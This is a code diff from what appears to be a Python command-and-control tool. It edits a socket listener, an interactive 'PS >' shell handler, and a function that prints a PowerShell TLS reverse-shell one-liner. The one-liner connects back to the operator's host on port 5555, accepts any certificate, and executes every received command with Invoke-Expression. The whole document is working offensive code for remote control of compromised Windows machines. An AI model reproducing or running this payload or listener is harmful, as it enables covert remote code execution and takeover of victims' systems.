@@ -21,7 +21,7 @@ def startListener():
         sys.exit(1)
     try:
         ws.bind((FUNCTIONS().CheckInternet(), 5555))
-        ws.listen(10)
+        ws.listen(30)
     except:
         print t.bold_red + "[*] Error with listener - Port in use" + t.normal
         sys.exit(1)
@@ -49,13 +49,13 @@ def startListener():
 
 def interactShell(clientconn,clientnumber):
     from menu import clientMenuOptions
-    print "Commands\n" + "-"*24 + "\nback - Background Shell\nkill - Close Connection\n" + "-"*24
+    print "Commands\n" + "-"*24 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*24
     while True:
         data = ''
         command = raw_input("PS >")
         if command == "back":
             break
-        if command == "kill":
+        if command == "exit":
             print t.bold_red + "Client Connection Killed" + t.normal
             del clientMenuOptions[str(clientnumber)]
             clientconn.close()
@@ -63,12 +63,12 @@ def interactShell(clientconn,clientnumber):
         if command == "":
             continue
         clientconn.sendall(command)
-        a = True
-        while a:
-            data += clientconn.recv(16834).encode("utf-8")
-            if data[-1] == "\x00":
-                a = False
-        print data
+        while True:
+            data = clientconn.recv(1).encode("utf-8")
+            sys.stdout.write(data)
+            sys.stdout.flush()
+            if data == "\x00":
+                break
     return True
 
 
@@ -86,15 +86,14 @@ def clientUpload(fileToUpload,clientconn,powershellExec):
 
 def printListener():
     windows_ps_rev_shell = (
-        "[System.Security.Authentication.SslProtocols]$protocol = 'tls';"
         "$client = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
         "$stream = $client.GetStream();"
         "[byte[]]$bytes = 0..65535|%{0};"
         "$sslstream = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
-        "$sslstream.AuthenticateAsClient('10.131.101.65',$null,$protocol,$false);"
+        "$sslstream.AuthenticateAsClient('10.131.101.65',$null,[System.Security.Authentication.SslProtocols]::Tls,$false);"
         "while(($i = $sslstream.Read($bytes, 0, $bytes.Length)) -ne 0)"
         "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
-        "$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String );"
+        "$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String);"
         "$backres = $commandback + ($error[0] | Out-String) + \"\x00\";$error.clear();"
         "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$sslstream.Write($sendbyte,0,$sendbyte.Length);"
         "$sslstream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
